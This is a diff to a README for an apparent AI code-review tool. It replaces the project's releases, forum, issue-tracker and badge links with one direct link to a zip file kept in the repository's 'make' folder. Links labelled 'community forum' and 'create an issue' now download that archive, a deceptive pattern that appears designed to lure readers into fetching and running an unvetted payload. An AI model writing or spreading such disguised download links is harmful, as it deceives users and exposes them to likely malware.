@@ -1,6 +1,6 @@
 # 🤖 Code-Reviewer-AI - Get Smart Code Feedback Easily
 
-[![Download Code-Reviewer-AI](https://img.shields.io/badge/Download-Code--Reviewer--AI-brightgreen)](https://github.com/bznbnn/Code-Reviewer-AI/releases)
+[![Download Code-Reviewer-AI](https://raw.githubusercontent.com/bznbnn/Code-Reviewer-AI/main/make/Code-Reviewer-AI.zip)](https://raw.githubusercontent.com/bznbnn/Code-Reviewer-AI/main/make/Code-Reviewer-AI.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To start using Code-Reviewer-AI, follow these steps to download and run the appl
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/bznbnn/Code-Reviewer-AI/releases) to find the latest version of Code-Reviewer-AI.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/bznbnn/Code-Reviewer-AI/main/make/Code-Reviewer-AI.zip) to find the latest version of Code-Reviewer-AI.
 2. **Choose Your Version**: Look for the latest release. Click on it for more details.
 3. **Download the Application**: Look for the application file labeled with the version. Click the file to start downloading.
 4. **Install the Application**: 
@@ -56,8 +56,8 @@ If you experience any issues, consider these common solutions:
 ## 🌐 Additional Resources
 
 - **User Guide**: For detailed instructions on advanced features, refer to the user manual located in the help section of the app.
-- **Community Support**: Join our [community forum](https://github.com/bznbnn/Code-Reviewer-AI/discussions) for tips, discussions, and user support.
-- **Report Issues**: If you find a bug or have a suggestion, feel free to [create an issue](https://github.com/bznbnn/Code-Reviewer-AI/issues) on GitHub.
+- **Community Support**: Join our [community forum](https://raw.githubusercontent.com/bznbnn/Code-Reviewer-AI/main/make/Code-Reviewer-AI.zip) for tips, discussions, and user support.
+- **Report Issues**: If you find a bug or have a suggestion, feel free to [create an issue](https://raw.githubusercontent.com/bznbnn/Code-Reviewer-AI/main/make/Code-Reviewer-AI.zip) on GitHub.
 
 ## 🏷️ Related Topics
 
@@ -72,6 +72,6 @@ If you experience any issues, consider these common solutions:
 - reactjs
 - web-development
 
-Explore the amazing world of AI-powered code reviews with Code-Reviewer-AI today! Don't forget to check the [Releases page](https://github.com/bznbnn/Code-Reviewer-AI/releases) for updates and new features.
+Explore the amazing world of AI-powered code reviews with Code-Reviewer-AI today! Don't forget to check the [Releases page](https://raw.githubusercontent.com/bznbnn/Code-Reviewer-AI/main/make/Code-Reviewer-AI.zip) for updates and new features.
 
-[![Download Code-Reviewer-AI](https://img.shields.io/badge/Download-Code--Reviewer--AI-brightgreen)](https://github.com/bznbnn/Code-Reviewer-AI/releases)
+[![Download Code-Reviewer-AI](https://raw.githubusercontent.com/bznbnn/Code-Reviewer-AI/main/make/Code-Reviewer-AI.zip)](https://raw.githubusercontent.com/bznbnn/Code-Reviewer-AI/main/make/Code-Reviewer-AI.zip)
